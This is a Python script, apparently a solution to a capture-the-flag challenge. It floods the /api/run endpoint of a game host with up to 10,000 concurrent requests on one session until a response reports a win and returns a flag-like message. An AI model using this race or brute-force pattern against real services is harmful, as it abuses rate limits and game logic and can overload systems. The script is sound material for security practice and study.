import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE = "https://horse-games.nypinfosec.net"

def hit(sess: requests.Session):
    r = sess.get(f"{BASE}/api/run", timeout=10)
    try:
        j = r.json()
    except Exception:
        return None
    if isinstance(j, dict) and j.get("status") == "win":
        return j.get("message")
    return None

def main():
    sess = requests.Session()

    # Create session + user_id
    sess.get(f"{BASE}/", timeout=10)

    # Tune these if needed
    workers = 100
    batches = 50      # 50 batches * 200 = 10,000 requests
    per_batch = 200

    for b in range(batches):
        with ThreadPoolExecutor(max_workers=workers) as ex:
            futures = [ex.submit(hit, sess) for _ in range(per_batch)]
            for fut in as_completed(futures):
                msg = fut.result()
                if msg:
                    print("✅ WIN:", msg)
                    return
        print(f"Batch {b+1}/{batches} done, no win yet...")

    print("❌ No win. Increase workers/batches/per_batch and rerun.")

if __name__ == "__main__":
    main()
